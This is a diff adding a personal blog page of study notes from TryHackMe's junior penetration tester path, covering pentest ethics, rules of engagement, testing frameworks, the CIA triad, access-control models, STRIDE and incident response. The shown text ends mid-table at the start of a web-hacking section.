@@ -1,0 +1,1604 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by yousinix
+  Free for personal and commercial use under the MIT license
+  https://github.com/yousinix/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Jr Penetratino Tester">
+  <meta property="og:description" content="Hey everyone">
+  <meta property="og:image" content="https://raw.githubusercontent.com//MrP-cpu/Mrp-cpu.github.io/main/assets/image.jpg">
+
+  <title>Jr Penetratino Tester</title>
+  <meta name="description" content="Hey everyone">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>MrP-CPU</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Jr Penetratino Tester</b></h1>
+
+<p class="post-metadata text-muted">
+  24 August 2024 -  
+  <b>57 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#cyber">
+      <span class="tag badge badge-pill text-primary border border-primary">cyber</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#penetration-testing">
+      <span class="tag badge badge-pill text-primary border border-primary">Penetration Testing</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#red-teaming">
+      <span class="tag badge badge-pill text-primary border border-primary">Red Teaming</span>
+    </a>
+    </p>
+
+<p>This learning path covers the core technical skills that will allow you to succeed as a junior penetration tester. Upon completing this path, you will have the practical skills necessary to perform security assessments against web applications and enterprise infrastructure.</p>
+
+<h3 id="pre-requisites">Pre-Requisites:</h3>
+
+<ul>
+  <li>You need a basic understanding of fundamental computing principles and a broad understanding of the different areas of cyber security to complete this pathway. If you do not already have these prerequisites, complete the  <a href="https://tryhackme.com/path/outline/presecurity">Pre-Security Pathway</a> and <a href="https://tryhackme.com/path/outline/introtocyber">Intro To Cyber Security Pathway</a>.</li>
+</ul>
+
+<div style="text-align: center;">
+  <img src="https://raw.githubusercontent.com/MrP-cpu/MrP-cpu.github.io/main/assets/images/parts.png" alt="Parts diagram" style="max-width:100%; height:auto;" />
+  <p style="font-style: italic; color: gray;">Parts diagram used in the circuit</p>
+</div>
+
+<hr />
+
+<h1 id="introduction-to-pentesting">Introduction to Pentesting</h1>
+
+<blockquote>
+  <p>[!Introduction]
+Understand what a penetration test involves, including testing techniques and methodologies every pentester should know.
+This module will teach you the various methodologies and testing techniques that every penetration tester should know. By the end of the module, you will be able to identify what framework best suits your pentest engagement and know what security policies are used to protect data from cyber threats; involving keeping data confidential, integral, and available.</p>
+</blockquote>
+
+<h3 id="pentesting-fundamentals">Pentesting Fundamentals</h3>
+<ul>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>&gt;Learn the important ethics and methodologies behind every pentest.*</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<h4 id="what-is-penetration-testing"><strong>What is penetration testing?</strong></h4>
+<p>A Penetration test or pentest is an ethically-driven attempt to test and analyse the security defences to protect these assets and pieces of information. A penetration test involves using the same tools, techniques, and methodologies that someone with malicious intent would use and is similar to an audit.</p>
+
+<h4 id="penetration-testing-ethics"><strong>Penetration Testing Ethics</strong></h4>
+<p>penetration test is an <strong>authorised audit</strong> of a computer system’s security and defences as agreed by the owners of the systems. The legality of penetration is pretty clear-cut in this sense; anything that falls outside of this agreement is deemed unauthorised.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Hat Category</strong></th>
+      <th><strong>Description</strong></th>
+      <th><strong>Example</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>White Hat</td>
+      <td>These hackers are considered the “good people”. They remain within the law and use their skills to benefit others.</td>
+      <td>For example, a penetration tester performing an authorised engagement on a company.</td>
+    </tr>
+    <tr>
+      <td>Grey Hat</td>
+      <td>These people use their skills to benefit others often; however, they do not respect/follow the law or ethical standards at all times.</td>
+      <td>For example, someone taking down a scamming site.</td>
+    </tr>
+    <tr>
+      <td>Black Hat</td>
+      <td>These people  are criminals and often seek to damage organisations or gain some form of financial benefit at the cost of others.</td>
+      <td>For example, ransomware authors infect devices with malicious code and hold data for ransom.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Rules of Engagement (ROE)</strong></p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/60c8baae098f1b1bbd9e0c440ea21a11.svg" alt="" /></p>
+
+<p>The ROE is a document that is created at the initial stages of a penetration testing engagement. This document consists of three main sections (explained in the table below), which are ultimately responsible for deciding how the engagement is carried out. The SANS institute has a great example of this document which you can view online <a href="https://sansorg.egnyte.com/dl/bF4I3yCcnt/?">here</a>.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Section</strong></th>
+      <th><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Permission</td>
+      <td>This section of the document gives explicit permission for the engagement to be carried out. This permission is essential to legally protect individuals and organisations for the activities they carry out.</td>
+    </tr>
+    <tr>
+      <td>Test Scope</td>
+      <td>This section of the document will annotate specific targets to which the engagement should apply. For example, the penetration test may only apply to certain servers or applications but not the entire network.</td>
+    </tr>
+    <tr>
+      <td>Rules</td>
+      <td>The rules section will define exactly the techniques that are permitted during the engagement. For example, the rules may specifically state that techniques such as phishing attacks are prohibited, but MITM (Man-in-the-Middle) attacks are okay.</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+<h4 id="penetration-testing-methodologies">Penetration Testing Methodologies</h4>
+
+<ul>
+  <li>can have a wide variety of objectives and targets within scope. Because of this, no penetration test is the same, and there are no one-case fits all as to how a penetration tester should approach it.</li>
+  <li>The steps a penetration tester takes during an engagement is known as the methodology</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Stage</strong></th>
+      <th><strong>Description</strong></th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Information Gathering</td>
+      <td>This stage involves collecting as much publically accessible information about a target/organisation as possible, for example, OSINT and research. <br /><br /><strong>Note:</strong> This does not involve scanning any systems.</td>
+    </tr>
+    <tr>
+      <td>Enumeration/Scanning</td>
+      <td>This stage involves discovering applications and services running on the systems. For example, finding a web server that may be potentially vulnerable.</td>
+    </tr>
+    <tr>
+      <td>Exploitation</td>
+      <td>This stage involves leveraging vulnerabilities discovered on a system or application. This stage can involve the use of public exploits or exploiting application logic.</td>
+    </tr>
+    <tr>
+      <td>Privilege Escalation</td>
+      <td>Once you have successfully exploited a system or application (known as a foothold), this stage is the attempt to expand your access to a system. You can escalate horizontally and vertically, where horizontally is accessing another account of the same permission group (i.e. another user), whereas vertically is that of another permission group (i.e. an administrator).</td>
+    </tr>
+    <tr>
+      <td>Post-exploitation</td>
+      <td>This stage involves a few sub-stages:  <br /><br /><strong>1.</strong> What other hosts can be targeted (pivoting)<br /><br /><strong>2.</strong> What additional information can we gather from the host now that we are a privileged user<br /><br /><strong>3.</strong>  Covering your tracks<br /><br /><strong>4.</strong> Reporting</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>OSSTMM</strong></p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/72a3a5b98b737f422f58b78e11e82646.png" alt="" /></p>
+
+<p><a href="https://www.isecom.org/OSSTMM.3.pdf">The Open Source Security Testing Methodology Manual</a> provides a detailed framework of testing strategies for systems, software, applications, communications and the human aspect of cybersecurity.</p>
+
+<p>The methodology focuses primarily on how these systems, applications communicate, so it includes a methodology for:</p>
+
+<ol>
+  <li><strong>Telecommunications (phones, VoIP, etc.)</strong></li>
+  <li>Wired Networks</li>
+  <li>Wireless communications</li>
+</ol>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Advantages</strong></td>
+      <td><strong>Disadvantages</strong></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Covers various testing strategies in-depth.</td>
+      <td>The framework is difficult to understand, very detailed, and tends to use unique definitions.</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>Includes testing strategies for specific targets (I.e. telecommunications and networking)</td>
+      <td><em>Intentionally left blank.</em></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>The framework is flexible depending upon the organisation’s needs.</td>
+      <td><em>Intentionally left blank.</em></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>The framework is meant to set a standard for systems and applications, meaning that a universal methodology can be used in a penetration testing scenario.</td>
+      <td><em>Intentionally left blank.</em></td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>OWASP</strong></p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/497e56c5522ca4932d720ae5fae32845.png" alt="" /></p>
+
+<p>The “<a href="https://owasp.org/">Open Web Application Security Project</a>” framework is a community-driven and frequently updated framework used solely to test the security of web applications and services.</p>
+
+<p>The foundation regularly <a href="https://owasp.org/www-project-top-ten/2017/">writes reports</a> stating the top ten security vulnerabilities a web application may have, the testing approach, and remediation.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Advantages</strong></td>
+      <td><strong>Disadvantages</strong></td>
+    </tr>
+    <tr>
+      <td>Easy to pick up and understand.</td>
+      <td>It may not be clear what type of vulnerability a web application has (they can often overlap).</td>
+    </tr>
+    <tr>
+      <td>Actively maintained and is frequently updated.</td>
+      <td>OWASP does not make suggestions to any specific software development life cycles.</td>
+    </tr>
+    <tr>
+      <td>It covers all stages of an engagement: from testing to reporting and remediation.</td>
+      <td>The framework doesn’t hold any accreditation such as CHECK.</td>
+    </tr>
+    <tr>
+      <td>Specialises in web applications and services.</td>
+      <td><em>Intentionally left blank.</em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>NIST Cybersecurity Framework 1.1</strong></p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/8e11f5fcfc8fc6429fe35682797e2a24.jpg" alt="" /></p>
+
+<p>The <a href="https://www.nist.gov/cyberframework">NIST Cybersecurity Framework</a> is a popular framework used to improve an organisations cybersecurity standards and manage the risk of cyber threats. This framework is a bit of an honourable mention because of its popularity and detail.</p>
+
+<p>The framework provides guidelines on security controls &amp; benchmarks for success for organisations from critical infrastructure (power plants, etc.) all through to commercial.  There is a limited section on a standard guideline for the methodology a penetration tester should take.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Advantages</strong></td>
+      <td><strong>Disadvantages</strong></td>
+    </tr>
+    <tr>
+      <td>The NIST Framework is estimated to be used by 50% of American organisations by 2020.</td>
+      <td>NIST has many iterations of frameworks, so it may be difficult to decide which one applies to your organisation.</td>
+    </tr>
+    <tr>
+      <td>The framework is extremely detailed in setting standards to help organisations mitigate the threat posed by cyber threats.</td>
+      <td>The NIST framework has weak auditing policies, making it difficult to determine how a breach occurred.</td>
+    </tr>
+    <tr>
+      <td>The framework is very frequently updated.</td>
+      <td>The framework does not consider cloud computing, which is quickly becoming increasingly popular for organisations.</td>
+    </tr>
+    <tr>
+      <td>NIST provides accreditation for organisations that use this framework.</td>
+      <td><em>Intentionally left blank.  <br /></em></td>
+    </tr>
+    <tr>
+      <td>The NIST framework is designed to be implemented alongside other frameworks.</td>
+      <td><em>Intentionally left blank.  <br /></em></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>NCSC CAF</strong></p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/6e10e0fd0b6020d42873c218e1d37044.png" alt="" /></p>
+
+<p>The <a href="https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance">Cyber Assessment Framework</a> (CAF) is an extensive framework of fourteen principles used to assess the risk of various cyber threats and an organisation’s defences against these.</p>
+
+<p>The framework applies to organisations considered to perform “vitally important services and activities” such as critical infrastructure, banking, and the likes. The framework mainly focuses on and assesses the following topics:</p>
+
+<ul>
+  <li>Data security</li>
+  <li>System security</li>
+  <li>Identity and access control</li>
+  <li>Resiliency</li>
+  <li>Monitoring</li>
+  <li>Response and recovery planning</li>
+</ul>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Advantages</td>
+      <td>Disadvantages</td>
+    </tr>
+    <tr>
+      <td>This framework is backed by a government cybersecurity agency.</td>
+      <td>The framework is still new in the industry, meaning that organisations haven’t had much time to make the necessary changes to be suitable for it.</td>
+    </tr>
+    <tr>
+      <td>This framework provides accreditation.</td>
+      <td>The framework is based on principles and ideas and isn’t as direct as having rules like some other frameworks.</td>
+    </tr>
+    <tr>
+      <td>This framework covers fourteen principles which range from security to response.</td>
+      <td>Intentionally left blank.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 id="black-box-white-box-grey-box-penetration-testing">Black box, White box, Grey box Penetration Testing</h4>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/f151a3f248f18f0ef61111c601efdac1.svg" alt="" /></p>
+
+<p>There are three primary scopes when testing an application or service. Your understanding of your target will determine the level of testing that you perform in your penetration testing engagement. In this task, we’ll cover these three different scopes of testing.</p>
+
+<p><strong>Black-Box Testing</strong>!</p>
+
+<p>This testing process is a high-level process where the tester is not given any information about the inner workings of the application or service.</p>
+
+<p>The tester acts as a regular user testing the functionality and interaction of the application or piece of software. This testing can involve interacting with the interface, i.e. buttons, and testing to see whether the intended result is returned. No knowledge of programming or understanding of the programme is necessary for this type of testing.</p>
+
+<p>Black-Box testing significantly increases the amount of time spent during the information gathering and enumeration phase to understand the attack surface of the target.</p>
+
+<p><strong>Grey-Box Testing</strong></p>
+
+<p>This testing process is the most popular for things such as penetration testing. It is a combination of both black-box and white-box testing processes. The tester will have some <strong>limited</strong> knowledge of the internal components of the application or piece of software. Still, it will be interacting with the application as if it were a black-box scenario and then using their knowledge of the application to try and resolve issues as they find them.</p>
+
+<p>With Grey-Box testing, the limited knowledge given saves time, and is often chosen for extremely well-hardened attack surfaces.</p>
+
+<p><strong>White-Box Testing</strong>!</p>
+
+<p>This testing process is a low-level process usually done by a software developer who knows programming and application logic. The tester will be testing the internal components of the application or piece of software and, for example, ensuring that specific functions work correctly and within a reasonable amount of time.</p>
+
+<p>The tester will have <strong>full</strong> knowledge of the application and its expected behaviour and is much more time consuming than black-box testing. The full knowledge in a White-Box testing scenario provides a testing approach that guarantees the entire attack surface can be validated.</p>
+
+<h4 id="practical-acme-penetration-test">Practical: ACME Penetration Test</h4>
+<p>![[Pasted image 20241103232147.png]]</p>
+
+<p>![[Pasted image 20241103232200.png]]</p>
+
+<p>![[Pasted image 20241103232214.png]]</p>
+
+<p>![[Pasted image 20241103232256.png]]</p>
+
+<p>![[Pasted image 20241103232304.png]]</p>
+
+<p>![[Pasted image 20241103232317.png]]</p>
+
+<p>![[Pasted image 20241103232334.png]]</p>
+
+<p>![[Pasted image 20241103232349.png]]</p>
+
+<hr />
+<h3 id="principles-of-security">Principles of Security</h3>
+
+<p>Learn the principles of information security that secures data and protects systems from abuse</p>
+
+<h4 id="cia-triad--">CIA Triad -&gt;</h4>
+<p>![[Pasted image 20241104024843.png]]</p>
+<ul>
+  <li>information security model that is used to consideration thoroughout creating a security policy .</li>
+  <li><strong>C</strong>onfidentiality, <strong>I</strong>ntegrity and <strong>A</strong>vailability (<strong>CIA</strong>), this model has quickly become an industry standard today. This model should help determine the value of data that it applies to, and in turn, the attention it needs from the business.</li>
+</ul>
+
+<p>![[Pasted image 20241104024850.png]]
+<strong>Confidentiality</strong></p>
+
+<p>This element is the protection of data from unauthorized access and misuse. Organisations will always have some form of sensitive data stored on their systems. To provide confidentiality is to protect this data from parties that it is not intended for.</p>
+
+<p>There are many real-world examples for this, for example, employee records and accounting documents will be considered sensitive. Confidentiality will be provided in the sense that only HR administrators will access employee records, where vetting and tight access controls are in place. Accounting records are less valuable (and therefore less sensitive), so not as stringent access controls would be in place for these documents. Or, for example, governments using a sensitivity classification rating system (top-secret, classified, unclassified)</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/8baaae53303b90143e5cb20821202bd4.png" alt="" /></p>
+
+<p><strong>Integrity</strong></p>
+
+<p>The CIA triad element of integrity is the condition where information is kept accurate and consistent unless authorized changes are made. It is possible for the information to change because of careless access and use, errors in the information system, or unauthorized access and use. In the CIA triad, integrity is maintained when the information remains unchanged during storage, transmission, and usage not involving modification to the information. Steps must be taken to ensure data cannot be altered by unauthorised people (for example, in a breach of confidentiality).</p>
+
+<p>Many defences to ensure integrity can be put in place. Access control and rigorous authentication can help prevent authorized users from making unauthorized changes. Hash verifications and digital signatures can help ensure that transactions are authentic and that files have not been modified or corrupted.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/d194e35fc5fd158b20e64a3c8c5123d1.png" alt="" /></p>
+
+<p><strong>Availability</strong></p>
+
+<p>In order for data to be useful, it must be available and accessible by the user.</p>
+
+<p>The main concern in the CIA triad is that the information should be available when authorised users need to access it.</p>
+
+<p>Availability is very often a key benchmark for an organisation. For example, having 99.99% uptime on their websites or systems (this is laid out in Service Level Agreements). When a system is unavailable, it often results in damage to an organisations reputation and loss of finances. Availability is achieved through a combination of many elements, including:</p>
+
+<ul>
+  <li>Having reliable and well-tested hardware for their information technology servers (i.e. reputable servers)</li>
+  <li>Having redundant technology and services in the case of failure of the primary</li>
+  <li>Implementing well-versed security protocols to protect technology and services from attack</li>
+</ul>
+
+<h4 id="principles-of-privileges">Principles of Privileges</h4>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/b89ffd2bbfbdd7c3837508619ff7027f.png" alt="" /></p>
+
+<p>It is vital to administrate and correctly define the various levels of access to an information technology system individuals require. </p>
+
+<p>The levels of access given to individuals are determined on two primary factors:</p>
+
+<ul>
+  <li>The individual’s role/function within the organisation</li>
+  <li>The sensitivity of the information being stored on the system</li>
+</ul>
+
+<p>Two key concepts are used to assign and manage the access rights of individuals: Privileged Identity Management (PIM) and Privileged Access Management (or PAM for short).</p>
+
+<p>Initially, these two concepts can seem to overlap; however, they are different from one another. PIM is used to translate a user’s role within an organisation into an access role on a system. Whereas PAM is the management of the privileges a system’s access role has, amongst other things.</p>
+
+<p>What is essential when discussing privilege and access controls is the principle of least privilege. Simply, users should be given the minimum amount of privileges, and only those that are absolutely necessary for them to perform their duties. Other people should be able to trust what people write to.</p>
+
+<p>As we previously mentioned, PAM incorporates more than assigning access. It also encompasses enforcing security policies such as password management, auditing policies and reducing the attack surface a system faces.</p>
+
+<h4 id="security-models-continued">Security Models Continued</h4>
+
+<p>Before discussing security models further, let’s recall the three elements of the CIA triad: Confidentiality, Integrity and Availability. We’ve previously outlined what these elements are and their importance. However, there is a formal way of achieving this.</p>
+
+<p>According to a security model, any system or piece of technology storing information is called an information system, which is how we will reference systems and devices in this task.</p>
+
+<p>Let’s explore some popular and effective security models used to achieve the three elements of the CIA triad.</p>
+
+<p><strong>The Bell-La Padula M</strong><strong>odel</strong></p>
+
+<p>The Bell-La Padula Model is used to achieve confidentiality. This model has a few assumptions, such as an organisation’s hierarchical structure it is used in, where everyone’s responsibilities/roles are well-defined.</p>
+
+<p>The model works by granting access to pieces of data (called objects) on a strictly need to know basis. This model uses the rule “no write down, no read up”.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Advantages</strong></td>
+      <td><strong>Disadvantages</strong></td>
+    </tr>
+    <tr>
+      <td>Policies in this model can be replicated to real-life organisations hierarchies (and vice versa)</td>
+      <td>Even though a user may not have access to an object, they will know about its existence – so it’s not confidential in that aspect.</td>
+    </tr>
+    <tr>
+      <td>Simple to implement and understand, and has been proven to be successful.</td>
+      <td>The model relies on a large amount of trust within the organisation.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/0e6e5d9d80785fc287b4a67e1453b295.png" alt="" /></p>
+
+<p>The Bell LaPadula Model is popular within organisations such as governmental and military. This is because members of the organisations are presumed to have already gone through a process called vetting. Vetting is a screening process where applicant’s backgrounds are examined to establish the risk they pose to the organisation. Therefore, applicants who are successfully vetted are assumed to be trustworthy - which is where this model fits in.</p>
+
+<p><strong>Biba Model</strong></p>
+
+<p>The Biba model is arguably the equivalent of the Bell-La Padula model but for the integrity of the CIA triad.</p>
+
+<p>This model applies the rule to objects (data) and subjects (users) that can be summarised as “no write up, no read down”. This rule means that subjects <strong>can</strong> create or write content to objects at or below their level but <strong>can only</strong> read the contents of objects above the subject’s level.</p>
+
+<p>Let’s compare some advantages and disadvantages of this model in the table below:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Advantages</strong></td>
+      <td><strong>Disadvantages</strong></td>
+    </tr>
+    <tr>
+      <td>This model is simple to implement.</td>
+      <td>There will be many levels of access and objects. Things can be easily overlooked when applying security controls.</td>
+    </tr>
+    <tr>
+      <td>Resolves the limitations of the Bell-La Padula model by addressing both confidentiality and data integrity.</td>
+      <td>Often results in delays within a business. For example, a doctor would not be able to read the notes made by a nurse in a hospital with this model.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/895ba351ef24ef6495d290222e49470e.png" alt="" /></p>
+
+<p>The Biba model is used in organisations or situations where integrity is more important than confidentiality. For example, in software development, developers may only have access to the code that is necessary for their job. They may not need access to critical pieces of information such as databases, etc.</p>
+
+<h4 id="threat-modelling--incident-response">Threat Modelling &amp; Incident Response</h4>
+
+<p>Threat modelling is the process of reviewing, improving, and testing the security protocols in place in an organisation’s information technology infrastructure and services.</p>
+
+<p>A critical stage of the threat modelling process is identifying likely threats that an application or system may face, the vulnerabilities a system or application may be vulnerable to.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/aabdd83977336fd44b3645a86e5ba20e.png" alt="" /></p>
+
+<p>The threat modelling process is very similar to a risk assessment made in workplaces for employees and customers. The principles all return to:</p>
+
+<ul>
+  <li>Preparation</li>
+  <li>Identification</li>
+  <li>Mitigations</li>
+  <li>Review</li>
+</ul>
+
+<p>It is, however, a complex process that needs constant review and discussion with a dedicated team. An effective threat model includes:</p>
+
+<ul>
+  <li>Threat intelligence</li>
+  <li>Asset identification</li>
+  <li>Mitigation capabilities</li>
+  <li>Risk assessment</li>
+</ul>
+
+<p>To help with this, there are frameworks such as <strong>STRIDE</strong> (<strong>S</strong>poofing identity, <strong>T</strong>ampering with data, <strong>R</strong>epudiation threats, <strong>I</strong>nformation disclosure, <strong>D</strong>enial of Service and <strong>E</strong>levation of privileges) and <strong>PASTA</strong> (<strong>P</strong>rocess for <strong>A</strong>ttack <strong>S</strong>imulation and <strong>T</strong>hreat <strong>A</strong>nalysis) infosec never tasted so good!. Let’s detail STRIDE below. STRIDE, authored by two Microsoft security researchers in 1999 is still very relevant today. STRIDE includes six main principles, which I have detailed in the table below:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Principle</strong></td>
+      <td><strong>Description</strong></td>
+    </tr>
+    <tr>
+      <td>Spoofing</td>
+      <td>This principle requires you to authenticate requests and users accessing a system. Spoofing involves a malicious party falsely identifying itself as another.<br /><br />Access keys (such as API keys) or signatures via encryption helps remediate this threat.</td>
+    </tr>
+    <tr>
+      <td>Tampering</td>
+      <td>By providing anti-tampering measures to a system or application, you help provide integrity to the data. Data that is accessed must be kept integral and accurate.<br /><br />For example, shops use seals on food products.</td>
+    </tr>
+    <tr>
+      <td>Repudiation</td>
+      <td>This principle dictates the use of services such as logging of activity for a system or application to track.</td>
+    </tr>
+    <tr>
+      <td>Information Disclosure</td>
+      <td>Applications or services that handle information of multiple users need to be appropriately configured to only show information relevant to the owner.</td>
+    </tr>
+    <tr>
+      <td>Denial of Service</td>
+      <td>Applications and services use up system resources, these two things should have measures in place so that abuse of the application/service won’t result in bringing the whole system down.</td>
+    </tr>
+    <tr>
+      <td>Elevation of Privilege</td>
+      <td>This is the worst-case scenario for an application or service. It means that a user was able to escalate their authorization to that of a higher level i.e. an administrator. This scenario often leads to further exploitation or information disclosure.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>A breach of security is known as an incident. And despite all rigorous threat models and secure system designs, incidents do happen. Actions taken to resolve and remediate the threat are known as Incident Response (IR) and are a whole career path in cybersecurity.</p>
+
+<p>Incidents are classified using a rating of urgency and impact. Urgency will be determined by the type of attack faced, where the impact will be determined by the affected system and what impact that has on business operations.</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/ab0cc8478b0bce9a400187f559d36dd6.png" alt="" /></p>
+
+<p>An incident is responded to by a <strong>C</strong>omputer <strong>S</strong>ecurity <strong>I</strong>ncident <strong>R</strong>esponse <strong>T</strong>eam (<strong>CSIRT</strong>) which is prearranged group of employees with technical knowledge about the systems and/or current incident. To successfully solve an incident, these steps are often referred to as the six phases of Incident Response that takes place, listed in the table below:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Action</strong></td>
+      <td><strong>Description</strong></td>
+    </tr>
+    <tr>
+      <td>Preparation</td>
+      <td>Do we have the resources and plans in place to deal with the security incident?</td>
+    </tr>
+    <tr>
+      <td>Identification</td>
+      <td>Has the threat and the threat actor been correctly identified in order for us to respond to?</td>
+    </tr>
+    <tr>
+      <td>Containment</td>
+      <td>Can the threat/security incident be contained to prevent other systems or users from being impacted?</td>
+    </tr>
+    <tr>
+      <td>Eradication</td>
+      <td>Remove the active threat.</td>
+    </tr>
+    <tr>
+      <td>Recovery</td>
+      <td>Perform a full review of the impacted systems to return to business as usual operations.</td>
+    </tr>
+    <tr>
+      <td>Lessons Learned</td>
+      <td>What can be learnt from the incident? I.e. if it was due to a phishing email, employees should be trained better to detect phishing emails.</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+<h1 id="introduction-to-web-hacking">Introduction to Web Hacking</h1>
+
+<blockquote>
+  <p>[!introduction] introduction
+Get hands-on, learn about and exploit some of the most popular web application vulnerabilities seen in the industry today.</p>
+
+  <p>In this module you will learn about the most common web application vulnerabilities, understanding what makes it vulnerable and putting theory into practice by hacking website simulations. You will also be taught how to identify, exploit and prevent each vulnerability.</p>
+</blockquote>
+
+<p>![[Pasted image 20241104032305.png]]</p>
+
+<h3 id="walking-an-application">Walking An Application</h3>
+
+<p><em>Manually review a web application for security issues using only your browsers developer tools. Hacking with just your browser, no tools or scripts.</em></p>
+
+<p>![[Pasted image 20241104033253.png]]</p>
+
+<h4 id="exploring-the-website">Exploring The Website</h4>
+
+<p>As a penetration tester, your role when reviewing a website or web application is to discover features that could potentially be vulnerable and attempt to exploit them to assess whether or not they are. These features are usually parts of the website that require some interactivity with the user.</p>
+
+<p>Finding interactive portions of the website can be as easy as spotting a login form to manually reviewing the website’s JavaScript. An excellent place to start is just with your browser exploring the website and noting down the individual pages/areas/features with a summary for each one.</p>
+
+<p>An example site review for the Acme IT Support website would look something like this:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
